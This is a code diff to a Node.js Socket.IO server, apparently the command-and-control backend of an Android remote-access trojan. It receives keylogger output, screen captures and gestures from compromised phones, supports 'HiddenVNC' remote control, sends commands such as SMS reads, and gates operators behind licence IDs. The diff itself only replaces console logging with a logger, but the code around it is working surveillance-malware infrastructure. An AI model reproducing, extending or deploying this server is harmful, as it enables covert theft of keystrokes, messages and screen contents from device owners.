 
@@ -1595,18 +1598,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid app-result data from ${uuid}`);
+      logger.error(`❌ Invalid app-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [app-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [app-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast app-result event to all web clients
       io.emit("device_event", {
@@ -1617,24 +1620,24 @@ io.on("connection", (socket) => {
       });
       
       
-      console.log(`📤 Broadcasted app_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted app_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [app-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [app-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- KEYLOGGER RESULT from device --------
   socket.on("keylogger-result", (data) => {
-    console.log(`⌨️ [keylogger-result] ========== EVENT RECEIVED ==========`);
-    console.log(`⌨️ [keylogger-result] Socket ID: ${socket.id}`);
-    console.log(`⌨️ [keylogger-result] Is authenticated: ${isAuthenticated}`);
-    console.log(`⌨️ [keylogger-result] Socket UUID: ${socket.uuid}`);
-    console.log(`⌨️ [keylogger-result] Data:`, data);
-    console.log(`⌨️ [keylogger-result] Data type:`, typeof data);
-    console.log(`⌨️ [keylogger-result] Is array:`, Array.isArray(data));
+    logger.log(`⌨️ [keylogger-result] ========== EVENT RECEIVED ==========`);
+    logger.log(`⌨️ [keylogger-result] Socket ID: ${socket.id}`);
+    logger.log(`⌨️ [keylogger-result] Is authenticated: ${isAuthenticated}`);
+    logger.log(`⌨️ [keylogger-result] Socket UUID: ${socket.uuid}`);
+    logger.log(`⌨️ [keylogger-result] Data:`, data);
+    logger.log(`⌨️ [keylogger-result] Data type:`, typeof data);
+    logger.log(`⌨️ [keylogger-result] Is array:`, Array.isArray(data));
     
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated keylogger-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated keylogger-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1642,18 +1645,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data - be more lenient
     if (!data) {
-      console.error(`❌ Invalid keylogger-result data from ${uuid}`);
+      logger.error(`❌ Invalid keylogger-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [keylogger-result] Processing data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [keylogger-result] Processing data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Handle different data formats
       let processedData = data;
@@ -1673,7 +1676,7 @@ io.on("connection", (socket) => {
         }
       }
       
-      console.log(`📥 [keylogger-result] Processed data:`, JSON.stringify(processedData, null, 2));
+      logger.log(`📥 [keylogger-result] Processed data:`, JSON.stringify(processedData, null, 2));
       
       // Broadcast keylogger-result event to all web clients
       const eventPayload = {
@@ -1683,21 +1686,21 @@ io.on("connection", (socket) => {
         data: processedData,
       };
       
-      console.log(`📤 [keylogger-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
+      logger.log(`📤 [keylogger-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
       io.emit("device_event", eventPayload);
       
-      console.log(`✅ [keylogger-result] Broadcasted keylogger_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
-      console.log(`⌨️ [keylogger-result] ===========================================`);
+      logger.log(`✅ [keylogger-result] Broadcasted keylogger_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
+      logger.log(`⌨️ [keylogger-result] ===========================================`);
     } catch (err) {
-      console.error(`❌ [keylogger-result] Error processing data from ${uuid}:`, err.message);
-      console.error(`❌ [keylogger-result] Error stack:`, err.stack);
+      logger.error(`❌ [keylogger-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [keylogger-result] Error stack:`, err.stack);
     }
   });
 
   // -------- SKELETON RESULT from device --------
   socket.on("skeleton-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated skeleton-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated skeleton-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1705,18 +1708,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid skeleton-result data from ${uuid}`);
+      logger.error(`❌ Invalid skeleton-result data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`📥 [skeleton-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`📥 [skeleton-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast skeleton-result event to all web clients
       io.emit("device_event", {
@@ -1726,16 +1729,16 @@ io.on("connection", (socket) => {
         data: data,
       });
       
-      console.log(`📤 Broadcasted skeleton_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted skeleton_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [skeleton-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [skeleton-result] Error processing data from ${uuid}:`, err.message);
     }
   });
 
   // -------- SCREEN RESULT from device --------
   socket.on("screen-result", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated screen-result attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated screen-result attempt from ${socket.id}`);
       return;
     }
 
@@ -1743,22 +1746,22 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid screen-result data from ${uuid}`);
+      logger.error(`❌ Invalid screen-result data from ${uuid}`);
       return;
     }
 
     try {
       // Debug: Log raw data structure
-      console.log(`🔍 [screen-result] Raw data keys:`, Object.keys(data || {}));
-      console.log(`🔍 [screen-result] Raw data.image_data exists:`, !!data.image_data);
-      console.log(`🔍 [screen-result] Raw data.image_data type:`, typeof data.image_data);
-      console.log(`🔍 [screen-result] Raw data.image_data preview:`, data.image_data ? data.image_data.substring(0, 50) : 'null');
+      logger.log(`🔍 [screen-result] Raw data keys:`, Object.keys(data || {}));
+      logger.log(`🔍 [screen-result] Raw data.image_data exists:`, !!data.image_data);
+      logger.log(`🔍 [screen-result] Raw data.image_data type:`, typeof data.image_data);
+      logger.log(`🔍 [screen-result] Raw data.image_data preview:`, data.image_data ? data.image_data.substring(0, 50) : 'null');
       
       // Normalize field names - handle both formats
       // Device may send: image_data, frmt, wmob, hmob
@@ -1768,7 +1771,7 @@ io.on("connection", (socket) => {
       const width = data.wmob || data.width || null;
       const height = data.hmob || data.height || null;
       
-      console.log(`🔍 [screen-result] After extraction:`, {
+      logger.log(`🔍 [screen-result] After extraction:`, {
         imageDataExists: !!imageData,
         imageDataType: typeof imageData,
         imageDataLength: imageData ? imageData.length : 0,
@@ -1793,7 +1796,7 @@ io.on("connection", (socket) => {
         // Remove quotes if they wrap the string, but preserve base64 characters
         imageData = imageData.replace(/^["']+|["']+$/g, '');
         
-        console.log(`🔍 [screen-result] After cleaning:`, {
+        logger.log(`🔍 [screen-result] After cleaning:`, {
           imageDataLength: imageData.length,
           preview: imageData.substring(0, 50),
           firstChar: imageData[0],
@@ -1803,7 +1806,7 @@ io.on("connection", (socket) => {
       
       // Ensure leading slash is preserved (critical for JPEG base64)
       if (imageData && !imageData.startsWith('/') && imageData.startsWith('9j/')) {
-        console.log(`⚠️ [screen-result] Missing leading slash, fixing...`);
+        logger.log(`⚠️ [screen-result] Missing leading slash, fixing...`);
         imageData = '/' + imageData;
       }
       
@@ -1818,7 +1821,7 @@ io.on("connection", (socket) => {
         ...(data.type && { type: data.type }),
       };
       
-      console.log(`📺 [screen-result] Data from ${uuid}:`, {
+      logger.log(`📺 [screen-result] Data from ${uuid}:`, {
         hasImage: !!imageData,
         hasData: !!imageData,
         width: width,
@@ -1838,17 +1841,17 @@ io.on("connection", (socket) => {
         data: normalizedData,
       });
       
-      console.log(`📤 Broadcasted screen_result event for ${uuid}`);
+      logger.log(`📤 Broadcasted screen_result event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [screen-result] Error processing data from ${uuid}:`, err.message);
-      console.error(`❌ [screen-result] Error stack:`, err.stack);
+      logger.error(`❌ [screen-result] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [screen-result] Error stack:`, err.stack);
     }
   });
 
   // -------- SWIPE DETECTION from device --------
   socket.on("swipe-detected", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated swipe-detected attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated swipe-detected attempt from ${socket.id}`);
       return;
     }
 
@@ -1856,13 +1859,13 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid swipe-detected data from ${uuid}`);
+      logger.error(`❌ Invalid swipe-detected data from ${uuid}`);
       return;
     }
 
@@ -1924,7 +1927,7 @@ io.on("connection", (socket) => {
         timestamp: new Date().toISOString(),
       };
 
-      console.log(`👆 [swipe-detected] Swipe detected on ${uuid}:`, {
+      logger.log(`👆 [swipe-detected] Swipe detected on ${uuid}:`, {
         direction: swipeData.direction,
         distance: Math.round(swipeData.distance),
         duration: swipeData.duration,
@@ -1940,17 +1943,17 @@ io.on("connection", (socket) => {
         data: swipeData,
       });
       
-      console.log(`📤 Broadcasted swipe_detected event for ${uuid}`);
+      logger.log(`📤 Broadcasted swipe_detected event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [swipe-detected] Error processing data from ${uuid}:`, err.message);
-      console.error(`❌ [swipe-detected] Error stack:`, err.stack);
+      logger.error(`❌ [swipe-detected] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [swipe-detected] Error stack:`, err.stack);
     }
   });
 
   // -------- GESTURE DETECTION from device (generic handler) --------
   socket.on("gesture-detected", (data) => {
     if (!isAuthenticated || !socket.uuid) {
-      console.warn(`⚠️ Unauthenticated gesture-detected attempt from ${socket.id}`);
+      logger.warn(`⚠️ Unauthenticated gesture-detected attempt from ${socket.id}`);
       return;
     }
 
@@ -1958,18 +1961,18 @@ io.on("connection", (socket) => {
     const client = clients.get(uuid);
     
     if (!client) {
-      console.error(`❌ Client not found for UUID: ${uuid}`);
+      logger.error(`❌ Client not found for UUID: ${uuid}`);
       return;
     }
 
     // Validate data
     if (!data || typeof data !== "object") {
-      console.error(`❌ Invalid gesture-detected data from ${uuid}`);
+      logger.error(`❌ Invalid gesture-detected data from ${uuid}`);
       return;
     }
 
     try {
-      console.log(`👆 [gesture-detected] Gesture detected on ${uuid}:`, JSON.stringify(data, null, 2));
+      logger.log(`👆 [gesture-detected] Gesture detected on ${uuid}:`, JSON.stringify(data, null, 2));
       
       // Broadcast gesture-detected event to all web clients
       io.emit("device_event", {
@@ -1982,9 +1985,9 @@ io.on("connection", (socket) => {
         },
       });
       
-      console.log(`📤 Broadcasted gesture_detected event for ${uuid}`);
+      logger.log(`📤 Broadcasted gesture_detected event for ${uuid}`);
     } catch (err) {
-      console.error(`❌ [gesture-detected] Error processing data from ${uuid}:`, err.message);
+      logger.error(`❌ [gesture-detected] Error processing data from ${uuid}:`, err.message);
     }
   });
 
@@ -1992,14 +1995,14 @@ io.on("connection", (socket) => {
   socket.on("swipe-detected-web", (data) => {
     // Web clients can emit swipe-detected events when interacting with HiddenVNC
     if (!data || typeof data !== "object") {
-      console.warn(`⚠️ Invalid swipe-detected-web data from ${socket.id}`);
+      logger.warn(`⚠️ Invalid swipe-detected-web data from ${socket.id}`);
       return;
     }
 
     const { deviceId, startX, startY, endX, endY, duration, direction, distance, velocity } = data;
 
     if (!deviceId || typeof deviceId !== "string") {
-      console.warn(`⚠️ Missing deviceId in swipe-detected-web from ${socket.id}`);
+      logger.warn(`⚠️ Missing deviceId in swipe-detected-web from ${socket.id}`);
       return;
     }
 
@@ -2049,7 +2052,7 @@ io.on("connection", (socket) => {
         source: "web_client", // Indicate this came from web client
       };
 
-      console.log(`👆 [swipe-detected-web] Swipe detected on device ${deviceId} from web client:`, {
+      logger.log(`👆 [swipe-detected-web] Swipe detected on device ${deviceId} from web client:`, {
         direction: swipeData.direction,
         distance: Math.round(swipeData.distance),
         duration: swipeData.duration,
@@ -2065,10 +2068,10 @@ io.on("connection", (socket) => {
         data: swipeData,
       });
       
-      console.log(`📤 Broadcasted swipe_detected event for ${deviceId} (from web client)`);
+      logger.log(`📤 Broadcasted swipe_detected event for ${deviceId} (from web client)`);
     } catch (err) {
-      console.error(`❌ [swipe-detected-web] Error processing data:`, err.message);
-      console.error(`❌ [swipe-detected-web] Error stack:`, err.stack);
+      logger.error(`❌ [swipe-detected-web] Error processing data:`, err.message);
+      logger.error(`❌ [swipe-detected-web] Error stack:`, err.stack);
     }
   });
 
@@ -2076,14 +2079,14 @@ io.on("connection", (socket) => {
   socket.on("click-detected-web", (data) => {
     // Web clients can emit click-detected events when interacting with HiddenVNC
     if (!data || typeof data !== "object") {
-      console.warn(`⚠️ Invalid click-detected-web data from ${socket.id}`);
+      logger.warn(`⚠️ Invalid click-detected-web data from ${socket.id}`);
       return;
     }
 
     const { deviceId, x, y, duration, timestamp } = data;
 
     if (!deviceId || typeof deviceId !== "string") {
-      console.warn(`⚠️ Missing deviceId in click-detected-web from ${socket.id}`);
+      logger.warn(`⚠️ Missing deviceId in click-detected-web from ${socket.id}`);
       return;
     }
 
@@ -2096,7 +2099,7 @@ io.on("connection", (socket) => {
         source: "web_client", // Indicate this came from web client
       };
 
-      console.log(`👆 [click-detected-web] Click detected on device ${deviceId} from web client:`, {
+      logger.log(`👆 [click-detected-web] Click detected on device ${deviceId} from web client:`, {
         at: `(${x}, ${y})`,
         duration,
       });
@@ -2109,10 +2112,10 @@ io.on("connection", (socket) => {
         data: clickData,
       });
       
-      console.log(`📤 Broadcasted click_detected event for ${deviceId} (from web client)`);
+      logger.log(`📤 Broadcasted click_detected event for ${deviceId} (from web client)`);
     } catch (err) {
-      console.error(`❌ [click-detected-web] Error processing data:`, err.message);
-      console.error(`❌ [click-detected-web] Error stack:`, err.stack);
+      logger.error(`❌ [click-detected-web] Error processing data:`, err.message);
+      logger.error(`❌ [click-detected-web] Error stack:`, err.stack);
     }
   });
 
@@ -2201,33 +2204,33 @@ io.on("connection", (socket) => {
 
     // Ensure param is present for input commands
     if (actualCommand === "input" && !cmdPayload.param) {
-      console.warn(`⚠️ [Device Server] Input command missing param, using default`);
+      logger.warn(`⚠️ [Device Server] Input command missing param, using default`);
       cmdPayload.param = actualParam || `keyevent 4`;
     }
 
     // Log args extraction for getapps command
     if (command === "getapps") {
-      console.log(`📤 [getapps] Command received:`);
-      console.log(`   Payload:`, payload);
-      console.log(`   Args extracted:`, payload?.args);
-      console.log(`   Args type:`, Array.isArray(payload?.args) ? "array" : typeof payload?.args);
-      console.log(`   Args length:`, payload?.args?.length);
+      logger.log(`📤 [getapps] Command received:`);
+      logger.log(`   Payload:`, payload);
+      logger.log(`   Args extracted:`, payload?.args);
+      logger.log(`   Args type:`, Array.isArray(payload?.args) ? "array" : typeof payload?.args);
+      logger.log(`   Args length:`, payload?.args?.length);
       if (Array.isArray(payload?.args)) {
-        console.log(`   Args[0] (type):`, payload.args[0]);
-        console.log(`   Args[1] (limit):`, payload.args[1]);
-        console.log(`   Args[2] (offset):`, payload.args[2]);
+        logger.log(`   Args[0] (type):`, payload.args[0]);
+        logger.log(`   Args[1] (limit):`, payload.args[1]);
+        logger.log(`   Args[2] (offset):`, payload.args[2]);
       }
-      console.log(`   Final cmdPayload:`, cmdPayload);
+      logger.log(`   Final cmdPayload:`, cmdPayload);
     }
 
     // Emit command to the device using the pattern "id-{uuid}"
     deviceClient.socket.emit(`id-${deviceId}`, cmdPayload);
 
-    console.log(`📤 [Web Client] Sent command '${command}' to device ${deviceId}`);
-    console.log(`   Button: ${payload?.button || actualPayload?.button || 'N/A'}`);
-    console.log(`   Command: ${cmdPayload.cmd}`);
-    console.log(`   Param: ${cmdPayload.param || 'None'}`);
-    console.log(`   Full Payload:`, JSON.stringify(cmdPayload, null, 2));
+    logger.log(`📤 [Web Client] Sent command '${command}' to device ${deviceId}`);
+    logger.log(`   Button: ${payload?.button || actualPayload?.button || 'N/A'}`);
+    logger.log(`   Command: ${cmdPayload.cmd}`);
+    logger.log(`   Param: ${cmdPayload.param || 'None'}`);
+    logger.log(`   Full Payload:`, JSON.stringify(cmdPayload, null, 2));
 
     // Send success confirmation back to web client
     socket.emit("command-sent", {
@@ -2242,21 +2245,21 @@ io.on("connection", (socket) => {
   // -------- DISCONNECT HANDLER --------
   socket.on("disconnect", (reason) => {
     const uuid = socket.uuid;
-    console.log(`🔌 [Device Server] Socket disconnected: ${socket.id}, reason: ${reason}`);
+    logger.log(`🔌 [Device Server] Socket disconnected: ${socket.id}, reason: ${reason}`);
     if (uuid && clients.has(uuid)) {
-      console.log(`   Device disconnected: ${uuid}`);
+      logger.log(`   Device disconnected: ${uuid}`);
       const c = clients.get(uuid);
       deviceRegistry.set(uuid, { info: c.info, lastSeen: Date.now(), userId: c.userId });
       clients.delete(uuid);
       saveDevices();
     } else {
-      console.log(`   Web client disconnected: ${socket.id}`);
+      logger.log(`   Web client disconnected: ${socket.id}`);
     }
   });
 
   // Add connection error handler
   socket.on("error", (error) => {
-    console.error(`❌ [Device Server] Socket error for ${socket.id}:`, error);
+    logger.error(`❌ [Device Server] Socket error for ${socket.id}:`, error);
   });
 });
 
@@ -2275,7 +2278,7 @@ app.use((req, res, next) => {
     res.header("Access-Control-Allow-Origin", "*");
   } else {
     // Block unauthorized origins
-    console.warn(`⚠️ CORS: Blocked request from origin: ${origin}`);
+    logger.warn(`⚠️ CORS: Blocked request from origin: ${origin}`);
     return res.status(403).json({ error: "Not allowed by CORS" });
   }
   
@@ -2289,29 +2292,29 @@ app.use((req, res, next) => {
 });
 
 app.get("/devices", async (req, res) => {
-  console.log(`📥 GET /devices - Request received`);
+  logger.log(`📥 GET /devices - Request received`);
   const licenseId = req.query.licenseId || req.headers['x-license-id'];
   
   // STRICT: License ID is REQUIRED - no fallback
   if (!licenseId) {
-    console.warn(`❌ GET /devices - License ID is required`);
+    logger.warn(`❌ GET /devices - License ID is required`);
     return res.status(401).json({ error: "License ID is required" });
   }
   
   // Validate License ID format
   if (typeof licenseId !== "string" || licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
-    console.warn(`❌ GET /devices - Invalid License ID format`);
+    logger.warn(`❌ GET /devices - Invalid License ID format`);
     return res.status(401).json({ error: "Invalid License ID format" });
   }
   
   // Validate License ID and get userId
   const userId = await validateLicenseId(licenseId);
   if (!userId) {
-    console.warn(`❌ GET /devices - Invalid License ID or user inactive`);
+    logger.warn(`❌ GET /devices - Invalid License ID or user inactive`);
     return res.status(401).json({ error: "Invalid License ID or user inactive" });
     }
   
-    console.log(`✅ License ID validated for user: ${userId}`);
+    logger.log(`✅ License ID validated for user: ${userId}`);
   
   // STRICT: Only return devices for this specific user - no fallback
   // Get connected devices for this user only
@@ -2342,7 +2345,7 @@ app.get("/devices", async (req, res) => {
     }));
 
   const allDevices = [...active, ...offline];
-  console.log(`📤 GET /devices - Returning ${allDevices.length} devices (${active.length} online, ${offline.length} offline) for user: ${userId}`);
+  logger.log(`📤 GET /devices - Returning ${allDevices.length} devices (${active.length} online, ${offline.length} offline) for user: ${userId}`);
 
   res.json({ devices: allDevices });
 });
@@ -2355,18 +2358,18 @@ app.get("/devices", async (req, res) => {
 async function validateDeviceUuid(deviceUuid) {
   // Basic validation: check if it's a non-empty string
   if (!deviceUuid || typeof deviceUuid !== "string" || deviceUuid.trim().length === 0) {
-    console.warn(`⚠️ Device UUID validation: Empty or invalid type`);
+    logger.warn(`⚠️ Device UUID validation: Empty or invalid type`);
     return null;
   }
 
   // If Supabase is not configured, can't validate
   if (!supabase) {
-    console.warn("⚠️ Supabase not configured, cannot validate device UUID");
+    logger.warn("⚠️ Supabase not configured, cannot validate device UUID");
     return null;
   }
 
   try {
-    console.log(`🔍 Querying database for device UUID: ${deviceUuid}`);
+    logger.log(`🔍 Querying database for device UUID: ${deviceUuid}`);
     // Query devices table to find the device and get user_id
     const { data: device, error } = await supabase
       .from("devices")
@@ -2375,22 +2378,22 @@ async function validateDeviceUuid(deviceUuid) {
       .single();
 
     if (error) {
-      console.error("❌ Error validating device UUID:", error.message);
-      console.error("   Error details:", error);
+      logger.error("❌ Error validating device UUID:", error.message);
+      logger.error("   Error details:", error);
       return null;
     }
 
     if (device && device.user_id) {
-      console.log(`✅ Device UUID validated for user: ${device.user_id}`);
+      logger.log(`✅ Device UUID validated for user: ${device.user_id}`);
       return device.user_id;
     } else {
-      console.warn(`⚠️ Device UUID not found in database: ${deviceUuid}`);
+      logger.warn(`⚠️ Device UUID not found in database: ${deviceUuid}`);
     }
 
     return null;
   } catch (error) {
-    console.error("❌ Exception validating device UUID:", error.message);
-    console.error("   Stack:", error.stack);
+    logger.error("❌ Exception validating device UUID:", error.message);
+    logger.error("   Stack:", error.stack);
     return null;
   }
 }
@@ -2404,55 +2407,55 @@ async function validateDeviceUuid(deviceUuid) {
 async function validateLicenseId(licenseId) {
   // Basic validation: check if it's a non-empty string
   if (!licenseId || typeof licenseId !== "string" || licenseId.trim().length === 0) {
-    console.warn(`⚠️ License ID validation: Empty or invalid type`);
+    logger.warn(`⚠️ License ID validation: Empty or invalid type`);
     return null;
   }
 
   // Check format: must be 26 characters (25 alphanumeric + "=")
   if (licenseId.length !== 26 || !/^[A-Za-z0-9]{25}=$/.test(licenseId)) {
-    console.warn(`⚠️ License ID validation: Invalid format (length: ${licenseId.length}, pattern match: ${/^[A-Za-z0-9]{25}=$/.test(licenseId)})`);
+    logger.warn(`⚠️ License ID validation: Invalid format (length: ${licenseId.length}, pattern match: ${/^[A-Za-z0-9]{25}=$/.test(licenseId)})`);
     return null;
   }
 
   // Check cache first
   if (validatedLicenseIds.has(licenseId)) {
     const cachedUserId = validatedLicenseIds.get(licenseId);
-    console.log(`✅ License ID found in cache for user: ${cachedUserId}`);
+    logger.log(`✅ License ID found in cache for user: ${cachedUserId}`);
     return cachedUserId;
   }
 
   // Supabase is required - no fallback allowed for security
   if (!supabase) {
-    console.error("❌ CRITICAL: Supabase not configured - cannot validate License ID");
+    logger.error("❌ CRITICAL: Supabase not configured - cannot validate License ID");
     return null;
   }
 
   try {
-    console.log(`🔍 Querying database for license ID: ${licenseId.substring(0, 10)}...`);
+    logger.log(`🔍 Querying database for license ID: ${licenseId.substring(0, 10)}...`);
     // Use database function to validate license ID
     const { data: userId, error } = await supabase.rpc("validate_license_id_for_device", {
       license_id_to_validate: licenseId,
     });
 
     if (error) {
-      console.error("❌ Error validating license ID:", error.message);
-      console.error("   Error details:", error);
+      logger.error("❌ Error validating license ID:", error.message);
+      logger.error("   Error details:", error);
       return null;
     }
 
     if (userId) {
       // Cache the validated license ID
       validatedLicenseIds.set(licenseId, userId);
-      console.log(`✅ License ID validated for user: ${userId}`);
+      logger.log(`✅ License ID validated for user: ${userId}`);
       return userId;
     } else {
-      console.warn(`⚠️ License ID not found in database or user is inactive: ${licenseId.substring(0, 10)}...`);
+      logger.warn(`⚠️ License ID not found in database or user is inactive: ${licenseId.substring(0, 10)}...`);
     }
 
     return null;
   } catch (error) {
-    console.error("❌ Exception validating license ID:", error.message);
-    console.error("   Stack:", error.stack);
+    logger.error("❌ Exception validating license ID:", error.message);
+    logger.error("   Stack:", error.stack);
     return null;
   }
 }
@@ -2477,7 +2480,7 @@ async function validateEmailHash(emailHash) {
   // If Supabase is not configured, fall back to AUTH_SECRET (for backward compatibility)
   // Supabase is required - no fallback allowed for security
   if (!supabase) {
-    console.error("❌ CRITICAL: Supabase not configured - cannot validate email hash");
+    logger.error("❌ CRITICAL: Supabase not configured - cannot validate email hash");
     return null;
   }
 
@@ -2488,20 +2491,20 @@ async function validateEmailHash(emailHash) {
     });
 
     if (error) {
-      console.error("❌ Error validating email hash:", error.message);
+      logger.error("❌ Error validating email hash:", error.message);
       return null;
     }
 
     if (userId) {
       // Cache the validated hash
       validatedEmailHashes.set(emailHash, userId);
-      console.log(`✅ Email hash validated for user: ${userId}`);
+      logger.log(`✅ Email hash validated for user: ${userId}`);
       return userId;
     }
 
     return null;
   } catch (error) {
-    console.error("❌ Exception validating email hash:", error.message);
+    logger.error("❌ Exception validating email hash:", error.message);
     return null;
   }
 }
@@ -2565,8 +2568,8 @@ app.post("/api/command/:uuid", async (req, res) => {
   const uuid = req.params.uuid;
   const { cmd, param, licenseId } = req.body; // cmd like "getsms", param like "inbox|50|10", licenseId for validation
 
-  console.log(`📥 POST /api/command/${uuid} received`);
-  console.log(`   Body:`, req.body);
+  logger.log(`📥 POST /api/command/${uuid} received`);
+  logger.log(`   Body:`, req.body);
 
   if (!cmd) {
     return res.status(400).json({ error: "Missing cmd" });
@@ -2576,7 +2579,7 @@ app.post("/api/command/:uuid", async (req, res) => {
   try {
     validateCommand(cmd, param);
   } catch (validationError) {
-    console.error(`❌ Command validation failed:`, validationError.message);
+    logger.error(`❌ Command validation failed:`, validationError.message);
     return res.status(400).json({ 
       error: "Invalid command",
       message: validationError.message 
@@ -2590,7 +2593,7 @@ app.post("/api/command/:uuid", async (req, res) => {
 
   // Validate License ID to get user_id - REQUIRED, no fallback allowed
   if (!supabase) {
-    console.error("❌ CRITICAL: Supabase not configured - cannot validate License ID");
+    logger.error("❌ CRITICAL: Supabase not configured - cannot validate License ID");
     return res.status(503).json({ 
       error: "Service unavailable: Authentication service not configured",
       message: "Supabase must be configured to validate device commands"
@@ -2602,7 +2605,7 @@ app.post("/api/command/:uuid", async (req, res) => {
     return res.status(401).json({ error: "Invalid License ID or user inactive - authentication failed" });
   }
   
-  console.log(`✅ License ID validated for user: ${userId}`);
+  logger.log(`✅ License ID validated for user: ${userId}`);
   // Device UUID is just an identifier - we link it to the user from License ID
   // No need to check if device exists in database
 
@@ -2615,7 +2618,7 @@ app.post("/api/command/:uuid", async (req, res) => {
   // Link device to user if not already linked
   if (userId && !client.userId) {
     client.userId = userId;
-    console.log(`🔗 Linked device ${uuid} to user ${userId}`);
+    logger.log(`🔗 Linked device ${uuid} to user ${userId}`);
   }
 
   // Prepare payload with cmd, optional param, and licenseId
@@ -2627,8 +2630,8 @@ app.post("/api/command/:uuid", async (req, res) => {
   // Emit dynamically based on selected phone UUID
   client.socket.emit("id-" + uuid, payload);
 
-  console.log(`📤 Sent command '${cmd}' to device ${uuid}`);
-  console.log(`   Payload:`, payload);
+  logger.log(`📤 Sent command '${cmd}' to device ${uuid}`);
+  logger.log(`   Payload:`, payload);
 
   res.json({
     success: true,
@@ -2690,52 +2693,52 @@ const hostname = process.env.HOSTNAME || (isDevelopment ? '0.0.0.0' : '127.0.0.1
 
 server.on('error', (error) => {
   if (error.code === 'EADDRINUSE') {
-    console.error(`❌ Port ${PORT} is already in use!`);
-    console.error(`\nTo fix this:`);
-    console.error(`1. Find the process: netstat -ano | findstr :${PORT}`);
-    console.error(`2. Kill it: taskkill /PID <PID> /F`);
-    console.error(`3. Or run: npm run kill:port:9211`);
-    console.error(`4. Or use a different port: PORT=9212 npm run dev:device\n`);
+    logger.error(`❌ Port ${PORT} is already in use!`);
+    logger.error(`\nTo fix this:`);
+    logger.error(`1. Find the process: netstat -ano | findstr :${PORT}`);
+    logger.error(`2. Kill it: taskkill /PID <PID> /F`);
+    logger.error(`3. Or run: npm run kill:port:9211`);
+    logger.error(`4. Or use a different port: PORT=9212 npm run dev:device\n`);
     process.exit(1);
   } else {
-    console.error(`❌ Server error:`, error);
+    logger.error(`❌ Server error:`, error);
     process.exit(1);
   }
 });
 
 server.listen(PORT, hostname, () => {
-  console.log(`🚀 [Device Server] Server running at http://${hostname}:${PORT}`);
-  console.log(`✅ [Device Server] Ready to accept device connections`);
-  console.log(`\n📋 [Device Server] Connection Info:`);
-  console.log(`   Binding: http://${hostname}:${PORT}`);
+  logger.log(`🚀 [Device Server] Server running at http://${hostname}:${PORT}`);
+  logger.log(`✅ [Device Server] Ready to accept device connections`);
+  logger.log(`\n📋 [Device Server] Connection Info:`);
+  logger.log(`   Binding: http://${hostname}:${PORT}`);
   if (hostname === '127.0.0.1') {
-    console.log(`   ⚠️  SECURITY: Bound to localhost only - external access blocked`);
-    console.log(`   ✅ All traffic must route through nginx reverse proxy`);
+    logger.log(`   ⚠️  SECURITY: Bound to localhost only - external access blocked`);
+    logger.log(`   ✅ All traffic must route through nginx reverse proxy`);
   } else {
-    console.log(`   Local: http://localhost:${PORT}`);
-    console.log(`   Network: http://0.0.0.0:${PORT}`);
+    logger.log(`   Local: http://localhost:${PORT}`);
+    logger.log(`   Network: http://0.0.0.0:${PORT}`);
   }
